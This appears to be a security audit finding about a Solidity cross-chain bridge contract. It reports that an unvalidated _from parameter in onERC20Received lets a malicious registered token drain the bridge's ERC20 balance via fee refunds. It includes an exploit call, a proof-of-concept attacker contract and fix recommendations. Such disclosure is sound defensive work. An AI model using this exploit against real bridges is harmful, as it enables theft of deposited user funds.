### Title
Arbitrary `_from` Parameter in `onERC20Received` Enables Fee-Refund Drain from Bridge — (`contracts/service_chain/bridge/BridgeTransferERC20.sol`)

### Summary

`BridgeTransferERC20.onERC20Received` is a `public` function that accepts a caller-supplied `_from` address with no validation. This address is forwarded directly to `_payERC20FeeAndRefundChange`, which transfers fee-refund tokens from the bridge's own balance to `_from`. A malicious or compromised registered-token contract can call `onERC20Received` with `_from = attacker` and `_feeLimit = bridge_token_balance`, draining the bridge's entire ERC20 liquidity to an attacker-controlled address.

### Finding Description

`onERC20Received` is the 1-step bridge callback, intended to be called by a registered ERC20 token contract after it has transferred tokens to the bridge: [1](#0-0) 

It immediately delegates to `_requestERC20Transfer`, passing `msg.sender` as the token address (which is checked by `onlyRegisteredToken`) and the **caller-supplied** `_from` as the refund recipient: [2](#0-1) 

Inside `_payERC20FeeAndRefundChange`, the bridge transfers tokens from its own balance to the arbitrary `from` address: [3](#0-2) 

There is no check that `_from` equals `msg.sender`, the actual depositor, or any other trusted address. The `onlyRegisteredToken` modifier only validates `msg.sender` (the token contract address), not the `_from` parameter: [4](#0-3) 

### Impact Explanation

A malicious or compromised registered-token contract calls:

```
bridge.onERC20Received(
    attacker_address,   // _from — arbitrary, controls refund destination
    any_to,
    1,                  // _value — minimum to pass require(_value > 0)
    bridge_token_balance, // _feeLimit — set to entire bridge balance
    ""
)
```

When `feeOfERC20[token] == 0` (fee is zero), `_payERC20FeeAndRefundChange` executes:

```solidity
if (_feeLimit > 0) {
    IERC20(_token).safeTransfer(from, _feeLimit);  // transfers entire bridge balance to attacker
}
```

The bridge's full ERC20 liquidity is transferred to the attacker. Additionally, a `RequestValueTransfer` event is emitted, which the bridge operator will process on the counterpart chain, causing a second unauthorized outflow of bridged assets.

### Likelihood Explanation

The trigger requires the attacker to control a registered-token contract — a semi-trusted position requiring bridge-owner approval. However, registered token contracts are external code that can be upgradeable, have admin keys, or contain bugs. Once a registered token is compromised or is malicious from the start, the attack is trivially executable with a single transaction. The bridge holds real liquidity in non-`modeMintBurn` mode, making the impact immediate and total.

### Recommendation

1. Validate that `_from` equals `msg.sender` inside `onERC20Received`, or remove the `_from` parameter entirely and derive it from `msg.sender` at the token-contract level.
2. Alternatively, restrict `onERC20Received` with an `onlyRegisteredToken(msg.sender)` guard **and** require that `_feeLimit` does not exceed the amount actually transferred in the same transaction (e.g., by comparing pre/post balances).
3. Consider making `onERC20Received` callable only from within the same transaction as the token transfer (reentrancy-style guard or balance delta check).

### Proof of Concept

```
// Attacker controls MaliciousToken, which is registered in the bridge.
// Bridge holds 1000 MaliciousToken from legitimate user deposits.

contract MaliciousToken {
    function exploit(address bridge, address attacker) external {
        // Call onERC20Received directly — no tokens transferred to bridge
        IBridgeTransferERC20(bridge).onERC20Received(
            attacker,   // _from: fee refund goes here
            attacker,   // _to: cross-chain destination
            1,          // _value: passes require(_value > 0)
            1000 ether, // _feeLimit: entire bridge balance
            ""
        );
        // Result: bridge transfers 1000 MaliciousToken to attacker
        // AND emits RequestValueTransfer(value=1) for counterpart chain to process
    }
}

    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
```
